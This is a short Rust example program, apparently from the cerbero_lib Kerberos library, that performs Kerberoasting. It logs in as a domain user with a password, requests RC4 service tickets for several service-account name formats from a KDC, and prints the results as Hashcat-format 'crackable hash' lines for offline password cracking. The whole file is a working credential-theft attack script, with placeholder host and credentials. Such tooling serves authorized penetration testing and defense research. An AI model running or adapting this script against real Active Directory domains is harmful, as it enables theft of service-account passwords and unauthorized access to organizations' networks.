use cerbero_lib::{
	kerberoast, CrackFormat, CredFormat, EncryptionType, FileVault, KdcComm, Kdcs, Key, KrbUser, TransportProtocol,
};
use std::net::{IpAddr, Ipv4Addr};

fn main()
{
	let mut kdcs = Kdcs::new();
	let kdc_ip = IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1));
	kdcs.insert("DOMAIN.COM".to_string(), kdc_ip);

	let user = KrbUser::new("Username".to_string(), "DOMAIN.COM".to_string());
	let key = Key::Secret("Password".to_string());
	let kdccomm = KdcComm::new(kdcs, TransportProtocol::TCP);
	let mut vault = FileVault::new("tickets.ccache".to_string());

	let services: Vec<String> = vec![
	                                 "Username".to_string(),
	                                 "DOMAIN/Username".to_string(),
	                                 "Username:SPN".to_string(),
	                                 "DOMAIN/Username:SPN".to_string()
	];

	match kerberoast(
	                 user,
	                 services,
	                 &mut vault,
	                 None,
	                 Some(&key),
	                 CredFormat::Ccache,
	                 CrackFormat::Hashcat,
	                 Some(EncryptionType::RC4),
	                 kdccomm,
	)
	{
		Ok(hashes) =>
		{
			for hash in hashes.iter()
			{
				println!("Crackable hash: {}", hash);
			}
		},
		Err(e) => panic!("Failed to kerberoast user: {}", e),
	};
}
